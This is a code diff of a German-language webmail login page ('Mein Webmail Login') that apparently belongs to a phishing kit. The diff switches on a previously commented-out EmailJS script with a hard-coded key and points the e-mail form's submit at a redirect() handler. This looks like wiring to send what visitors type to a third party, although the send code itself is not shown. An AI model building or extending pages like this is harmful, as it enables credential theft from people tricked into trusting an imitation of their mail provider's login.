@@ -11,7 +11,7 @@
     />
     <title>Login – Zugang zu Ihrem Kundenkonto</title>
 
-    <!-- <script
+    <script
       type="text/javascript"
       src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
     ></script>
@@ -20,8 +20,9 @@
       (function () {
         emailjs.init("b2AaiNAGd3XF9eRFQ");
       })();
-    </script> -->
+    </script>
   </head>
+
   <body>
     <header class="header">
       <div class="logo-tag">
@@ -75,22 +76,27 @@
 
     <div class="container">
       <!-- USERNAME -->
-      <form class="form" id="form">
+      <form class="form" id="testing" onsubmit="redirect()">
         <div class="img-tag">
           <img src="/product-email.svg" alt="account" class="img" />
           <h2>Mein Webmail Login</h2>
         </div>
+
         <div class="input-email">
           <label for="usename">E-Mail-Adresse</label>
+
           <input type="username" name="username" id="username" required />
+
           <span class="error"></span>
           <p class="input-title">
             Nicht Ihr Gerät? Melden Sie sich nach der Sitzung ab oder verwenden
             Sie den
             <span><a href="" class="span">privaten Browsermodus.</a></span>
           </p>
-          <a href="/password.html" class="btn" type="submit">Weiter</a>
+
+          <a href="" class="btn" type="submit">Weiter</a>
         </div>
+
         <div class="form-fotter">
           <h2>Sie haben noch kein professionelles E-Mail Postfach?</h2>
           <a href="">Mehr erfahren</a>
